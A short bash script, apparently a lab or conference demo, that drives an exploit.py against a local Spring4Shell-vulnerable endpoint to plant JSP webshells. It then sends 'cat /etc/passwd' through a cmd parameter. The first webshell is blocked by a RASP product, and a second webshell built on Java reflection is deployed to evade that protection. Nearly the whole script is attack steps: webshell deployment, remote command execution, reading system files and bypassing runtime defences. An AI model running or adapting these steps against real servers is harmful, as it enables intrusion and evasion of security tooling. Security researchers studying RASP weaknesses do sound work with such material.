#!/bin/bash

# Color definitions
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m'  # No Color

echo -e "${RED}----Bypassing RASP using Reflection Abuse [Spring4Shell] 😈-----------${NC}"

echo -e "${GREEN}Deploying Webshell...${NC}"
python3 exploit.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="basic"
echo -e "\n"

sleep 8
res=$(curl "http://localhost:8080/basic.jsp?cmd=cat%20/etc/passwd")
echo -e "\n${res}\n"
echo -e "${RED} 🧿 RASP blocked us from reading /etc/passwd file 😠"
sleep 5

echo -e "${GREEN} Now deploy another webshell that uses reflection...${NC}"
python3 exploit.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="reflection"
sleep 8
echo -e "\n"


echo -e "${GREEN}Now let's use the other exploit using reflection ...${NC}"
curl "http://localhost:8080/reflection.jsp?cmd=cat%20/etc/passwd"
echo -e "\n"
